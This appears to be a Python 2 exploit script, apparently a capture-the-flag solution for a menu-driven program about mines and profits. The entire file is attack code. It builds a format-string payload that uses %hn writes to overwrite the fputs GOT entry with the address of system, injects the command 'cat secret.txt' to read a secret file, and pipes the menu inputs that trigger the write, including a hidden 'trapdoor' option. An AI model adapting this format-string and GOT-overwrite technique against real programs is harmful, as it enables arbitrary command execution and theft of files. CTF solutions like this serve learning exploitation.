#!/usr/bin/python

import struct


def send(x):
    print str(x)

def delete(pos):
    send(3)
    for i in range(pos):
        send('n')
    send('y')

def showMines():
    send(2)

def showProfit(pos):
    send(4)
    for i in range(pos):
        send('n')
    send('y')

def exit():
    send(5)


def trapdoor():
    send(0x63)

x='gold>silver'
x+='a'

send(x)
send(1)
fmt='cat secret.txt #'
fmt+=' '*2

pos=16

systemAddr=0x080485E0
fputsGOT=0x0804B00C
fmt+=struct.pack('<I', fputsGOT)
fmt+=struct.pack('<I', fputsGOT+2)

sz=len(fmt)
num=(systemAddr&0xffff)-sz
sz+=num

num2=(systemAddr>>16)-sz
if num2<0:
    num2+=1<<16

fmt+='%0'+str(num)+'x'
fmt+='%'+str(pos)+'$hn'
fmt+='%0'+str(num2)+'x'
fmt+='%'+str(pos+1)+'$hn'

send(fmt)
send(2)
send(2)
want=0x8049235

showProfit(3)
showProfit(3)
send('ls')

exit()
showMines()
delete(0)
delete(0)
delete(0)
delete(0)

showMines()
showProfit(1)
trapdoor()
showProfit(0)
exit()


